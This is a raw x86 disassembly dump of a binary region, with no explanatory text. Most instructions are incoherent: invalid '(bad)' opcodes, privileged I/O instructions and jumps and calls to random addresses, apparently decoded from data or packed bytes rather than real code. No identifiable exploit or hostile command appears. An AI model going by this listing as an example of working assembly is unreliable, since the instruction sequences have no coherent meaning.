  4394ad:	mov    gs,WORD PTR [ebx]
  4394af:	je     0x4394d3
  4394b1:	inc    esi
  4394b2:	xor    al,0x1e
  4394b4:	cmc    
  4394b5:	mov    edi,0x5d4883a0
  4394ba:	call   0x1a4828c2
  4394bf:	sbb    ebp,DWORD PTR [ebx]
  4394c1:	mov    BYTE PTR [ebx],bl
  4394c3:	pop    eax
  4394c4:	inc    esp
  4394c5:	mov    ch,0x81
  4394c7:	out    dx,eax
  4394c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4394c9:	mov    cl,0x79
  4394cb:	sldt   WORD PTR [eax]
	...
  4394e2:	add    BYTE PTR [eax],al
  4394e4:	add    BYTE PTR [eax],dh
  4394e6:	imul   DWORD PTR [eax]
  4394e8:	add    al,0x71
  4394ea:	inc    esp
  4394eb:	hlt    
  4394ec:	push   cs
  4394ed:	jnp    0x4394ae
  4394ef:	pop    eax
  4394f0:	sub    eax,0xa4d46931
  4394f5:	call   0xf718:0xe068ba0d
  4394fc:	ret    
  4394fd:	jae    0x43953e
  4394ff:	stos   DWORD PTR es:[edi],eax
  439500:	push   0x6fb359f4
  439505:	pop    ebx
  439506:	cmp    bh,0x81
  439509:	int    0x5e
  43950b:	push   edx
  43950c:	add    eax,DWORD PTR cs:[ecx]
  43950f:	pop    gs
  439511:	idiv   DWORD PTR [esi-0x2f3343c9]
  439517:	pop    es
  439518:	push   ss
  439519:	dec    ebx
  43951a:	or     eax,0x5b6d0be8
  43951f:	cli    
  439520:	jae    0x43958d
  439522:	pop    esi
  439523:	pop    edx
  439524:	mov    ds:0xe90b97de,al
  439529:	sub    al,BYTE PTR [edx-0xe539515]
  43952f:	dec    esi
  439530:	aas    
  439531:	and    eax,0x8aed745e
  439536:	shr    bl,1
  439538:	shr    DWORD PTR [edx-0x1d],0xf9
  43953c:	into   
  43953d:	jae    0x4394d7
  43953f:	jae    0x439574
  439541:	jo     0x43951c
  439543:	cmc    
  439544:	jmp    0x439518
  439546:	add    DWORD PTR [esi-0x13],esp
	...
  439561:	add    BYTE PTR [edi+ebx*2+0x5b5cf9fd],ch
  439568:	je     0x439563
  43956a:	dec    eax
  43956b:	rol    DWORD PTR [edi],1
  43956d:	sahf   
  43956e:	rcl    BYTE PTR [eax-0x6],cl
  439571:	sbb    al,0x1c
  439573:	pusha  
  439574:	or     BYTE PTR [ebp-0x567ca4e4],cl
  43957a:	fwait
  43957b:	hlt    
  43957c:	cli    
  43957d:	hlt    
  43957e:	daa    
  43957f:	jg     0x439543
  439581:	(bad)  
  439582:	fstp   QWORD PTR [edi-0x4b]
  439585:	ins    DWORD PTR es:[edi],dx
  439586:	sbb    al,0x5b
  439588:	sub    DWORD PTR [ecx],0xffffff9b
  43958b:	add    al,0xaf
  43958d:	call   0x3273efb2
  439592:	or     al,0xd1
  439594:	jmp    0x4395d7
  439596:	ins    DWORD PTR es:[edi],dx
  439597:	lahf   
  439598:	cli    
  439599:	add    BYTE PTR [edx-0x3a0f8c14],dh
  43959f:	add    eax,0xda22ffa3
  4395a4:	mov    ecx,0xc749835f
  4395a9:	ret    0x441
  4395ac:	push   ebp
  4395ad:	mov    esi,ecx
  4395af:	xor    cl,BYTE PTR [edi+0x68]
  4395b2:	xchg   ebp,eax
  4395b3:	fidivr WORD PTR [edx]
  4395b5:	add    BYTE PTR [edx],al
  4395b7:	pop    es
  4395b8:	jo     0x4395cc
  4395ba:	pop    ebp
  4395bb:	add    al,0x89
  4395bd:	inc    ebp
  4395be:	cmc    
  4395bf:	(bad)  
  4395c0:	mov    edx,0xba1b0f75
  4395c5:	push   ebx
	...
  4395de:	add    BYTE PTR [edx+0x3c],ch
  4395e1:	dec    esi
  4395e2:	mov    ds,ebp
  4395e4:	add    BYTE PTR [eax+0x33],dl
  4395e7:	and    ah,al
  4395e9:	adc    ebp,DWORD PTR [eax-0x7505bc01]
  4395ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4395f0:	test   ecx,edx
  4395f2:	je     0x43960d
  4395f4:	cmp    esi,edi
  4395f6:	bswap  ebp
  4395f8:	add    esp,DWORD PTR [edx+0x8]
  4395fb:	mov    ds:0x1ed6d815,al
  439600:	add    edi,esi
  439602:	adc    eax,0x3ff0b9
  439607:	inc    esi
  439608:	jmp    0xfc1d9590
  43960d:	dec    ebp
  43960e:	(bad)  
  43960f:	fsubr  st,st(4)
  439611:	dec    edx
  439612:	push   edi
  439613:	xor    esp,eax
  439615:	add    eax,0xfa3d8d00
  43961a:	mov    BYTE PTR [eax+0x18d3f5df],bl
  439620:	shl    DWORD PTR [ebx+0xe],0x6
  439624:	inc    esi
  439625:	idiv   BYTE PTR [ebx]
  439627:	fisttp DWORD PTR [edi+0x39]
  43962a:	(bad)  
  43962b:	hlt    
  43962c:	daa    
  43962d:	add    BYTE PTR [ebx],al
  43962f:	hlt    
  439630:	ret    0x52f9
  439633:	pop    esp
  439634:	rcl    BYTE PTR [ebp+0x617763fa],cl
  43963a:	je     0x439698
  43963c:	push   cs
  43963d:	adc    DWORD PTR [eax-0x7901521a],edi
	...
  43965b:	add    BYTE PTR [ebx],dh
  43965d:	(bad)
  439661:	nop
  439662:	jne    0x43964f
  439664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439665:	jmp    0x3475:0x8ff4fbe0
  43966c:	lods   al,BYTE PTR ds:[esi]
  43966d:	cmp    BYTE PTR [esi-0x3f173501],bh
  439673:	sti    
  439674:	les    eax,FWORD PTR [ebx+0x66d665fe]
  43967a:	out    dx,eax
  43967b:	pop    es
  43967c:	or     edx,DWORD PTR [edi+0x1589bf7f]
  439682:	sub    eax,0xbeb8f845
  439687:	cli    
  439688:	or     DWORD PTR [eax],edi
  43968a:	or     eax,0x66eaf440
  43968f:	jne    0x4396fa
  439691:	add    al,0x77
  439693:	inc    esp
  439694:	fsubr  DWORD PTR [eax+esi*8]
  439697:	sub    eax,0xfa9838dc
  43969c:	retf   
  43969d:	shl    DWORD PTR [esi-0x7c],cl
  4396a0:	ret    
  4396a1:	lock sbb cl,BYTE PTR [ebp+0x52ce7031]
  4396a8:	push   ds
  4396a9:	dec    edx
  4396aa:	popa   
  4396ab:	je     0x4396a9
  4396ad:	jle    0x4396fb
  4396af:	jle    0x43964d
  4396b1:	ins    DWORD PTR es:[edi],dx
  4396b2:	out    dx,eax
  4396b3:	movq   mm5,QWORD PTR [ecx]
  4396b6:	clc    
  4396b7:	test   BYTE PTR [eax+edx*2+0x53986ff],dh
  4396be:	gs jl  0x4396c1
	...
  4396d9:	sti    
  4396da:	mov    DWORD PTR [ecx],esp
  4396dc:	pop    edx
  4396dd:	rep lods eax,DWORD PTR ds:[esi]
  4396df:	inc    eax
  4396e0:	adc    DWORD PTR [edx+0x34324956],ebx
  4396e6:	mov    dh,0xa2
  4396e8:	cmp    al,0xa1
  4396ea:	or     eax,0x6972d0e9
  4396ef:	xchg   edi,eax
  4396f0:	sbb    al,0x58
  4396f3:	call   0x9d5409c5
  4396f8:	adc    BYTE PTR [esp+eax*1+0x58b078b2],dh
  4396ff:	mov    eax,0x935733d9
  439704:	imul   DWORD PTR [esi]
  439706:	shl    al,1
  439708:	inc    bp
  43970a:	sub    BYTE PTR [eax],0xf0
  43970d:	ficomp WORD PTR [ebx]
  43970f:	lods   al,BYTE PTR ds:[esi]
  439710:	xchg   DWORD PTR [bp+si],ebx
  439713:	jmp    0x8304:0x28f1f80f
  43971a:	pop    esp
  43971b:	pop    esi
  43971c:	out    dx,eax
  43971d:	into   
  43971e:	mov    DWORD PTR [ebx],ebp
  439720:	push   0xefe64572
  439725:	push   ss
  439726:	ins    DWORD PTR es:[edi],dx
  439727:	pusha  
  439728:	ficom  WORD PTR [ebp+0x6d]
  43972c:	ins    BYTE PTR es:[edi],dx
  43972d:	jo     0x439784
  43972f:	cmp    al,0x8
  439731:	cmp    DWORD PTR [edi+0x5626d4ac],0xcfbef81b
  43973b:	lock add BYTE PTR fs:[eax],al
	...
  439753:	add    BYTE PTR [eax],al
  439755:	add    BYTE PTR [ebp+0x29039081],ah
  43975b:	add    DWORD PTR [esi+0x3d],ebx
  43975e:	xchg   edx,eax
  43975f:	or     al,0x1a
  439761:	pop    esp
  439762:	dec    esp
  439763:	stos   DWORD PTR es:[edi],eax
  439764:	jns    0x4397cb
  439766:	retf   0xff44
  439769:	adc    eax,0xe1bd4cba
  43976e:	imul   DWORD PTR [edi-0x4b58aa7a]
  439774:	jle    0x43973a
  439776:	adc    edx,DWORD PTR [esi+0x4d]
  439779:	mov    edi,0xdd745a40
  43977e:	shl    al,1
  439780:	ret    
  439781:	(bad)  [edi]
  439783:	push   ebp
  439784:	stc    
  439785:	mov    ah,0xeb
  439787:	jge    0x4397bd
  439789:	sub    DWORD PTR [ebx],eax
  43978b:	(bad)  
  43978e:	mov    eax,0x28254488
  439793:	pop    edx
  439794:	je     0x439783
  439796:	nop
  439797:	pop    edx
  439798:	cli    
  439799:	jmp    0x953e4995
  43979e:	das    
  43979f:	pop    edx
  4397a0:	shr    DWORD PTR [eax+edi*4-0x30],1
  4397a4:	pop    ebx
  4397a5:	(bad)  
  4397a6:	jmp    0xf7d5:0xf7a90f08
  4397ad:	jae    0x4397c9
  4397af:	mov    ah,0x86
  4397b1:	sub    al,0x8c
  4397b3:	push   cs
  4397b4:	fsubr  st,st(6)
  4397b6:	cmp    BYTE PTR [esi+0x5d3f],dl
	...
  4397d0:	add    BYTE PTR [eax],al
  4397d2:	add    BYTE PTR [edx+0x50801c6c],dh
  4397d8:	dec    edi
  4397d9:	mov    BYTE PTR [eax+edx*2],ch
  4397dc:	mov    DWORD PTR [edi+0x4f140e35],edi
  4397e2:	mov    dh,0xe2
  4397e4:	add    BYTE PTR [eax-0x52],dl
  4397e7:	cli    
  4397e8:	mov    BYTE PTR ds:0x744ff829,cl
  4397ee:	cmc    
  4397ef:	inc    edx
  4397f0:	leave  
  4397f1:	sti    
  4397f2:	cmp    DWORD PTR [ecx],ebx
  4397f4:	fincstp 
  4397f6:	ss adc ecx,ebx
  4397f9:	pop    es
  4397fa:	add    BYTE PTR [edx-0x3e],bh
  4397fd:	jns    0x4397f7
  4397ff:	mov    WORD PTR [ebx+0xf],fs
  439802:	mov    esp,eax
  439804:	clc    
  439805:	test   al,al
  439807:	adc    DWORD PTR [ebx-0x7f],0x2cf194d
  43980e:	mov    edx,DWORD PTR [eax-0x20]
  439811:	loope  0x43981d
  439813:	retf   0xf262
  439816:	call   0x390765
  43981b:	pop    esi
  43981c:	enter  0x5e55,0x96
  439820:	bsr    edx,DWORD PTR [eax]
  439823:	pop    ebp
  439824:	inc    ebx
  439825:	sub    esp,0x5306bbde
  43982b:	or     ebp,0x33
  43982e:	js     0x439870
  439830:	dec    eax
  439831:	cli    
  439832:	push   esi
  439833:	ja     0x439889
  439835:	push   ecx
  439836:	lea    eax,[eax]
	...
  439850:	push   eax
  439851:	in     al,dx
  439852:	dec    edx
  439853:	lea    edx,[eax-0x1c]
  439856:	dec    edx
  439857:	push   0x40
  439859:	jmp    0x4ad7a0d1
  43985e:	idiv   bh
  439860:	jecxz  0x43982e
  439862:	cmp    ebp,DWORD PTR [eax-0x1505b800]
  439868:	test   DWORD PTR [ebx-0x369f0bbd],0x3648216e
  439872:	not    BYTE PTR [ecx+0x68]
  439875:	ss out dx,al
  439877:	push   ecx
  439878:	inc    edi
  439879:	dec    esi
  43987a:	dec    edx
  43987b:	mov    DWORD PTR [eax],esp
  43987d:	add    DWORD PTR [ecx-0x2f1866a3],ecx
  439883:	jmp    eax
  439885:	add    BYTE PTR [ecx-0x32186abb],cl
  43988b:	xor    esp,0xfffffff8
  43988e:	pop    ebx
  43988f:	jmp    DWORD PTR [eax]
  439891:	xchg   esi,eax
  439892:	mov    esi,0x41953f59
  439897:	add    esi,esp
  439899:	clc    
  43989a:	mov    ch,bl
  43989c:	and    eax,0xf84456ed
  4398a1:	pop    ebp
  4398a2:	(bad)  
  4398a3:	call   DWORD PTR [edx+esi*1]
  4398a6:	add    ch,BYTE PTR [edi]
  4398a8:	mov    ah,0xb6
  4398aa:	out    dx,eax
  4398ab:	jle    0x439886
  4398ad:	mov    ch,0x3
  4398af:	dec    edi
  4398b0:	ret    0x18e6
  4398b3:	rol    BYTE PTR [eax],0x0
	...
  4398ca:	add    BYTE PTR [eax],al
  4398cc:	add    BYTE PTR [ecx],cl
  4398ce:	sahf   
  4398cf:	(bad)  
  4398d0:	gs hlt 
  4398d2:	loopne 0x43989c
  4398d4:	mul    DWORD PTR [eax+ebp*8+0x22a4fac8]
  4398db:	(bad)  [ebx]
  4398dd:	inc    ebx
  4398de:	jo     0x4398e6
  4398e0:	sti    
  4398e1:	and    ch,al
  4398e3:	inc    ebx
  4398e4:	je     0x4398a0
  4398e6:	cli    
  4398e7:	clc    
  4398e8:	or     eax,DWORD PTR [edi]
  4398ea:	sahf   
  4398eb:	(bad)  
  4398ec:	jle    0x43990a
  4398ee:	xchg   edi,edx
  4398f0:	outs   dx,DWORD PTR ss:[esi]
  4398f2:	test   al,0x56
  4398f4:	aas    
  4398f5:	mov    BYTE PTR [eax+0x625c2966],dl
  4398fb:	pop    ebp
  4398fc:	xchg   BYTE PTR [eax+eiz*8],bl
  4398ff:	cmp    DWORD PTR [ebx-0x32],esi
  439902:	mov    bh,0x3
  439904:	lea    edi,[ecx]
  439906:	xor    al,0xae
  439908:	dec    esi
  439909:	jmp    0x4398c4
  43990b:	psubq  mm5,QWORD PTR [ecx+0x54]
  43990f:	pop    ebp
  439910:	shl    DWORD PTR [edi+0x44],1
  439913:	add    esi,DWORD PTR [ebp-0x1c]
  439916:	out    0xc7,al
  439918:	(bad)  
  43991a:	pushf  
  43991b:	rol    BYTE PTR [edi+ebp*2],cl
  43991e:	add    eax,0xfd6c5c34
  439923:	ins    DWORD PTR es:[edi],dx
  439924:	inc    esi
  439925:	call   0x899c:0xe46c35fd
  43992c:	(bad)
	...
  439949:	add    BYTE PTR [edi+eax*2+0x7e2603ec],ch
  439950:	ja     0x43999c
  439952:	cmc    
  439953:	loopne 0x4399af
  439955:	ret    
  439956:	sub    DWORD PTR [edx-0x6],0xffffffb1
  43995a:	jle    0x4399ae
  43995c:	push   edx
  43995d:	(bad)  
  43995e:	pop    ss
  43995f:	std    
  439960:	out    0xd7,eax
  439962:	cmc    
  439963:	mov    edx,0x528c1140
  439968:	inc    ecx
  439969:	mov    ?,WORD PTR ds:0xf40726b3
  43996f:	mov    bh,0x5d
  439971:	outs   dx,DWORD PTR ds:[esi]
  439972:	je     0x4399d5
  439974:	fadd   QWORD PTR [esp+esi*8]
  439977:	add    al,0xb6
  439979:	mov    ecx,0x86207da6
  43997e:	cs and edx,esp
  439981:	test   DWORD PTR [eax+0x7503e905],eax
  439987:	push   edx
  439988:	pop    eax
  439989:	or     ah,dh
  43998b:	add    al,0xea
  43998d:	xchg   edx,eax
  43998e:	jl     0x439995
  439990:	jmp    0xe0f40c98
  439995:	mov    BYTE PTR [edx],ch
  439997:	fpatan 
  439999:	adc    BYTE PTR [edi+0x6],al
  43999c:	pop    sp
  43999e:	icebp  
  43999f:	aad    0xeb
  4399a1:	test   bl,ah
  4399a3:	stc    
  4399a4:	push   ebx
  4399a5:	xlat   BYTE PTR ds:[ebx]
  4399a6:	jp     0x43997f
  4399a8:	hlt    
  4399a9:	dec    eax
  4399aa:	jo     0x4399f8
  4399ac:	mov    edx,0x61
	...
  4399c5:	add    BYTE PTR [eax],al
  4399c7:	into   
  4399c8:	or     BYTE PTR [eax],al
  4399ca:	jmp    0xaec89ec6
  4399cf:	pushf  
  4399d0:	inc    BYTE PTR [esi-0x73c49642]
  4399d6:	fs push eax
  4399d8:	dec    esp
  4399d9:	cli    
  4399da:	xchg   esi,eax
  4399db:	sbb    bl,cl
  4399dd:	aaa    
  4399de:	(bad)  
  4399df:	adc    eax,0xc3e939d2
  4399e4:	ror    DWORD PTR [edx],0x37
  4399e7:	mov    esi,0xcc268b4f
  4399ec:	sbb    cl,al
  4399ee:	sti    
  4399ef:	mov    edx,0xf7e9c7e9
  4399f4:	add    al,0xe8
  4399f6:	(bad)  
  4399f7:	pushf  
  4399f8:	dec    esi
  4399f9:	cli    
  4399fa:	(bad)  
  4399fb:	ror    BYTE PTR [eax+0x6968d5f1],0x36
  439a02:	xchg   esp,eax
  439a03:	aad    0x4e
  439a05:	sub    DWORD PTR cs:[ebp+0x30676c03],edi
  439a0c:	push   ecx
  439a0d:	fs pusha 
  439a0f:	cs leave 
  439a11:	out    0xeb,al
  439a13:	loopne 0x439a6b
  439a15:	test   BYTE PTR [edi],dl
  439a17:	dec    esp
  439a18:	in     eax,dx
  439a19:	push   edx
  439a1a:	push   ss
  439a1b:	inc    ebx
  439a1c:	std    
  439a1d:	popa   
  439a1e:	pusha  
  439a1f:	push   ss
  439a20:	cmc    
  439a21:	out    0x20,eax
  439a23:	dec    ebp
  439a24:	dec    esi
  439a25:	cli    
  439a26:	jo     0x439a66
  439a28:	add    DWORD PTR [ebp+0x29],eax
	...
  439a42:	add    BYTE PTR [eax],al
  439a44:	and    esi,esp
  439a46:	xchg   bh,ah
  439a48:	adc    DWORD PTR [edi+eax*4],eax
  439a4b:	mov    bh,0x94
  439a4d:	add    DWORD PTR [edi],ebp
  439a4f:	test   eax,0xa056aeb4
  439a54:	xor    DWORD PTR [eax],ecx
  439a56:	add    BYTE PTR [edx+0x2],ah
  439a59:	rcl    DWORD PTR [ecx],0x0
  439a5c:	or     eax,0x9db8509
  439a61:	sbb    ebp,DWORD PTR [eax-0x80]
  439a64:	fld    QWORD PTR [eax+eax*1]
  439a67:	(bad)  
  439a68:	repz inc eax
  439a6a:	fs add dh,bh
  439a6d:	in     eax,0x13
  439a6f:	push   eax
  439a70:	stos   DWORD PTR es:[edi],eax
  439a71:	inc    esp
  439a72:	cli    
  439a73:	mov    bl,al
  439a75:	add    BYTE PTR [ebx-0x3c],bh
  439a78:	rcr    esp,0xac
  439a7b:	push   eax
  439a7c:	jb     0x439a63
  439a7e:	dec    edx
  439a7f:	dec    DWORD PTR [eax+0x6aff4afc]
  439a85:	mov    DWORD PTR [esi-0x8eb08f4],edi
  439a8b:	jne    0x439a0e
  439a8d:	jg     0x439acf
  439a8f:	push   ss
  439a90:	lods   eax,DWORD PTR ds:[esi]
  439a91:	in     eax,0xcd
  439a93:	sbb    DWORD PTR [ecx],0x0
  439a96:	add    esi,0xffffffb6
  439a99:	ins    BYTE PTR es:[edi],dx
  439a9a:	dec    ecx
  439a9b:	push   ebp
  439a9c:	jnp    0x439a2b
  439a9e:	xor    eax,0x8b0a2e12
  439aa4:	add    al,0xdc
  439aa6:	jmp    DWORD PTR [esi+0x0]
	...
  439ac0:	add    BYTE PTR [edx],dl
  439ac2:	in     eax,0x81
  439ac4:	inc    edi
  439ac5:	cmp    eax,0x2b4c2b81
  439aca:	inc    esp
  439acb:	cli    
  439acc:	mov    BYTE PTR [ebx+0x54],bl
  439acf:	pusha  
  439ad0:	mov    ebx,DWORD PTR [edx+0x58]
  439ad3:	pusha  
  439ad4:	mov    DWORD PTR [ebx+0x58],ecx
  439ad7:	jns    0x439b40
  439ad9:	sub    eax,0x75c02b04
  439ade:	test   dl,bh
  439ae0:	dec    DWORD PTR ds:0xf947875e
  439ae6:	je     0x439b3d
  439ae8:	dec    eax
  439ae9:	pusha  
  439aea:	inc    edi
  439aeb:	inc    edx
  439aec:	push   ebx
  439aed:	hlt    
  439aee:	or     eax,0x9e27d45b
  439af3:	in     eax,0x2b
  439af5:	push   edx
  439af6:	aad    0xfe
  439af8:	cli    
  439af9:	dec    edx
  439afa:	cs jge 0x439abe
  439afd:	loop   0x439aee
  439aff:	pop    edx
  439b00:	aam    0x4e
  439b02:	push   edx
  439b03:	call   0xf1e21207
  439b08:	push   edx
  439b09:	mov    bl,0x58
  439b0b:	scas   al,BYTE PTR es:[edi]
  439b0c:	adc    DWORD PTR [esi+ebx*2],esi
  439b0f:	jge    0x439ad4
  439b11:	fcomp  DWORD PTR [esi]
  439b13:	mov    edx,0xb89b3f5c
  439b18:	xchg   BYTE PTR [eax-0xaa89024],ah
  439b1e:	pop    ebp
  439b1f:	dec    BYTE PTR [esi-0x39]
  439b22:	jb     0x439ad5
  439b24:	aaa    
	...
  439b3d:	add    BYTE PTR [ecx],bl
  439b3f:	push   edx
  439b40:	rol    BYTE PTR ds:0xe7ee3873,cl
  439b46:	jp     0x439b2f
  439b48:	pop    edx
  439b49:	cli    
  439b4a:	dec    edi
  439b4b:	fs scas al,BYTE PTR es:[edi]
  439b4d:	cli    
  439b4e:	loope  0x439b7d
  439b50:	data16 (bad) [edi]
  439b54:	pop    ebx
  439b55:	xchg   BYTE PTR [edx+edx*2+0x4d],al
  439b59:	jae    0x439afb
  439b5b:	loop   0x439b25
  439b5d:	or     esp,DWORD PTR [ebx+0x32a7a0d8]
  439b63:	out    dx,al
  439b64:	pop    edx
  439b65:	out    0x78,eax
  439b67:	dec    ecx
  439b68:	pop    ecx
  439b69:	cli    
  439b6a:	mov    gs,WORD PTR [eax-0x71]
  439b6d:	jl     0x439b93
  439b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439b70:	data16 and al,0x4e
  439b74:	pop    ecx
  439b75:	push   ecx
  439b76:	jns    0x439b58
  439b78:	stos   DWORD PTR es:[edi],eax
  439b79:	stc    
  439b7a:	add    ebx,DWORD PTR [esi-0x52]
  439b7d:	xchg   BYTE PTR [ebx],dh
  439b7f:	add    al,0x39
  439b81:	xchg   ecx,eax
  439b82:	cmp    cl,bh
  439b84:	cmp    BYTE PTR [eax+eax*4+0x77],ch
  439b88:	rcr    DWORD PTR [esi+0x62],1
  439b8b:	dec    ecx
  439b8c:	clc    
  439b8d:	mov    esi,0xd7c14d5a
  439b92:	out    dx,al
  439b93:	dec    ebp
  439b94:	xor    edi,eax
  439b96:	jb     0x439b60
  439b98:	loopne 0x439b4c
  439b9a:	mov    esi,0xe05ee0d5
  439b9f:	aam    0xfb
  439ba1:	ret    
	...
  439bba:	add    BYTE PTR [ebx+0x2104a083],dh
  439bc0:	add    ebx,DWORD PTR [edi+0x3b]
  439bc3:	sahf   
  439bc4:	fdiv   st,st(4)
  439bc6:	imul   ecx,eax,0xffffffa6
  439bc9:	sbb    DWORD PTR [esi+0x25],0x8ea5c15d
  439bd0:	dec    esi
  439bd1:	adc    cl,BYTE PTR [edx+0x419faa42]
  439bd7:	jmp    0x439bdd
  439bd9:	mov    esp,0x4c825f8a
  439bde:	iret   
  439bdf:	gs enter 0xf3e0,0xb2
  439be4:	jns    0x439bd1
  439be6:	inc    edi
  439be7:	jmp    0xc7fa84b0
  439bec:	frstor [ebp-0x23]
  439bef:	call   DWORD PTR [edx]
  439bf1:	mov    ebx,0xe80745ec
  439bf6:	xlat   BYTE PTR ds:[ebx]
  439bf7:	xlat   BYTE PTR ds:[ebx]
  439bf8:	(bad)  
  439bfa:	nop
  439bfb:	mov    al,0x44
  439bfd:	shr    BYTE PTR [ebx-0x8],0x20
  439c01:	adc    bl,BYTE PTR [esi+0x1e]
  439c04:	xlat   BYTE PTR ds:[ebx]
  439c05:	fmul   QWORD PTR [edx+0xb7a4e36]
  439c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439c0c:	dec    ebp
  439c0d:	adc    eax,0xfffc91b3
  439c12:	nop
  439c13:	outs   dx,BYTE PTR ds:[esi]
  439c14:	cmp    esp,edi
  439c16:	sub    cl,BYTE PTR [edx]
  439c18:	dec    esp
  439c19:	cli    
  439c1a:	ins    DWORD PTR es:[edi],dx
  439c1b:	cmp    dl,dl
  439c1d:	cmp    dl,BYTE PTR [ebx+0x0]
	...
  439c38:	cmc    
  439c39:	jg     0x439cb7
  439c3b:	frstor [eax+0x3902e765]
  439c41:	dec    ebx
  439c42:	mov    WORD PTR [eax+eax*1],gs
  439c45:	mov    ch,0xfa
  439c47:	aaa    
  439c48:	sbb    al,0x5d
  439c4a:	ins    DWORD PTR es:[edi],dx
  439c4b:	dec    ecx
  439c4c:	and    cl,BYTE PTR [ebx-0x7c]
  439c4f:	test   eax,0x247eae9c
  439c54:	add    BYTE PTR ds:0x49e3c72,al
  439c5a:	push   eax
  439c5b:	bound  edi,QWORD PTR [ebx+0x61ea6605]
  439c61:	gs stc 
  439c63:	xchg   DWORD PTR [ecx],esi
  439c65:	dec    ebx
  439c66:	xchg   BYTE PTR [edi],ah
  439c68:	mov    WORD PTR [eax-0x18500241],cs
  439c6e:	jmp    FWORD PTR [ebp-0x5e]
  439c71:	std    
  439c72:	gs in  eax,dx
  439c74:	fmul   QWORD PTR [eax+eax*4]
  439c77:	fild   QWORD PTR [edi+0x4d]
  439c7a:	jae    0x439c8c
  439c7c:	retf   0x103
  439c7f:	aad    0x3
  439c81:	cmp    BYTE PTR [ebp+edi*2-0x1b],0x44
  439c86:	out    0x5e,eax
  439c88:	sbb    eax,0x2a36fa4a
  439c8d:	stc    
  439c8e:	xchg   BYTE PTR [esi],ah
  439c90:	cdq    
  439c91:	rol    DWORD PTR [edi],cl
  439c93:	mov    ecx,0x934f3ed0
  439c98:	jmp    FWORD PTR [esi+eax*4+0x26]
	...
  439cb3:	add    BYTE PTR [eax],al
  439cb5:	nop
  439cb6:	mov    eax,0x81b90f6a
  439cbb:	mov    edi,0x81519100
  439cc0:	inc    esi
  439cc1:	sbb    DWORD PTR [ebx-0x6],ebx
  439cc4:	inc    BYTE PTR [ebx+0x630161f9]
  439cca:	fldenv [ebp+0x55a9dafe]
  439cd0:	pop    ebx
  439cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439cd2:	(bad)  
  439cd3:	(bad)  
  439cd4:	jmp    DWORD PTR [ebx]
  439cd6:	xchg   edx,eax
  439cd7:	cmp    ecx,0xc76a3156
  439cdd:	loop   0x439d17
  439cdf:	mov    BYTE PTR [eax-0x23],al
  439ce2:	xor    eax,0x74
  439ce5:	shl    al,1
  439ce7:	int    0xb6
  439ce9:	mov    ebp,DWORD PTR [ecx-0xc7a087f]
  439cef:	mov    ds:0x3eb28aff,al
  439cf4:	and    al,0x99
  439cf6:	pop    es
  439cf7:	je     0x439cff
  439cf9:	loop   0x439cd3
  439cfb:	sub    esp,DWORD PTR [ebp-0x387e5686]
  439d01:	jmp    0x8193:0x8d04bc8a
  439d08:	in     al,dx
  439d09:	fcom   QWORD PTR [ebp+0x32da5750]
  439d0f:	push   ss
  439d10:	xor    esi,DWORD PTR [esi-0x29e78c58]
  439d16:	scas   eax,DWORD PTR es:[edi]
  439d17:	cmc    
  439d18:	jne    0x439d1a
	...
  439d32:	popa   
  439d33:	test   eax,0x32ba1073
  439d38:	push   es
  439d39:	inc    DWORD PTR [eax-0x4aacb500]
  439d3f:	mov    ecx,0x7d4dfffa
  439d44:	jmp    0x1466:0x75340e3b
  439d4b:	mov    DWORD PTR [edx],ebx
  439d4d:	je     0x439d43
  439d4f:	sub    eax,0xa4690fe8
  439d54:	ret    0xa44e
  439d57:	add    dh,dl
  439d59:	dec    edi
  439d5a:	loop   0x439cf9
  439d5c:	(bad)  
  439d5d:	jle    0x439d97
  439d5f:	(bad)  
  439d60:	call   0x85c74162
  439d65:	inc    ecx
  439d66:	cmp    BYTE PTR [ebx-0x70],dl
  439d69:	inc    edx
  439d6a:	adc    eax,0x144a8ac4
  439d6f:	mov    esp,0xc3ece044
  439d74:	or     al,cl
  439d76:	pop    edx
  439d77:	aad    0xbd
  439d79:	inc    ecx
  439d7a:	jg     0x439d9e
  439d7c:	clc    
  439d7d:	mov    BYTE PTR [edx],bh
  439d7f:	fidivr WORD PTR es:[eax]
  439d82:	sbb    edx,DWORD PTR [edx-0x36]
  439d85:	ds push ds
  439d87:	add    cl,BYTE PTR [ecx-0x4bf0bfbf]
  439d8d:	cli    
  439d8e:	or     DWORD PTR [esi],ecx
  439d90:	out    dx,al
  439d91:	aas    
  439d92:	hlt    
  439d93:	fidivr WORD PTR [edi]
  439d95:	or     eax,DWORD PTR [eax]
	...
  439daf:	push   ds
  439db0:	sub    esi,DWORD PTR [esi-0x4fdc829f]
  439db6:	or     cl,BYTE PTR [edx+0x1a]
  439db9:	adc    DWORD PTR [edx+0x6f],esp
  439dbc:	jmp    0x620b:0xbc35620f
  439dc3:	call   FWORD PTR [edx+ebp*8]
  439dc6:	pminub mm4,mm4
  439dc9:	mov    ebp,0x20227751
  439dce:	lea    edi,[edx+0x7d4fada1]
  439dd4:	imul   esi,DWORD PTR [esi-0xf5e1606],0x3f
  439ddb:	hlt    
  439ddc:	fidivr WORD PTR [edi]
  439dde:	or     edi,DWORD PTR [ebp+0x4]
  439de1:	ret    
  439de2:	out    0xce,eax
  439de4:	jg     0x439e08
  439de6:	mov    edx,0x45b3adca
  439deb:	add    eax,DWORD PTR ds:0xb51f8eb4
  439df1:	xchg   edi,eax
  439df2:	or     al,BYTE PTR [edi+0x5]
  439df5:	mov    dh,0x35
  439df7:	or     BYTE PTR [esi+eiz*8-0x30],0xf3
  439dfc:	jge    0x439d99
  439dfe:	pop    ebx
  439dff:	jl     0x439db1
  439e01:	in     al,0x6e
  439e03:	repnz test eax,esp
  439e06:	repnz push 0xe3b06003
  439e0c:	jl     0x439e29
  439e0e:	pop    eax
  439e0f:	inc    ecx
  439e10:	dec    edx
  439e11:	cmp    esi,eax
	...
  439e2b:	add    dh,cl
  439e2d:	rcr    al,1
  439e2f:	mov    ch,0xbe
  439e31:	shl    ah,1
  439e33:	pop    edx
  439e34:	inc    eax
  439e35:	std    
  439e36:	test   eax,0x1b4aafd0
  439e3b:	pop    esp
  439e3c:	xchg   ebx,eax
  439e3d:	add    ecx,ebp
  439e3f:	add    esi,esp
